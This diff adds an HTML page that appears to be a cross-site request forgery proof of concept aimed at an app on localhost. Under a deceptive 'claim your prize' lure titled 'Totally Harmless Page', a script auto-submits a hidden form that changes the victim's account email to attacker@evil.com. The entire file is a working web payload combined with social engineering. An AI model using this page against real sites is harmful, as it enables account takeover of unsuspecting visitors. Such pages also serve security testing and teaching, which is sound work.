@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>Totally Harmless Page</title></head>
+<body>
+  <h1>Congratulations! Click anywhere to claim your prize.</h1>
+  <form id="csrf-form" action="http://localhost:3000/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
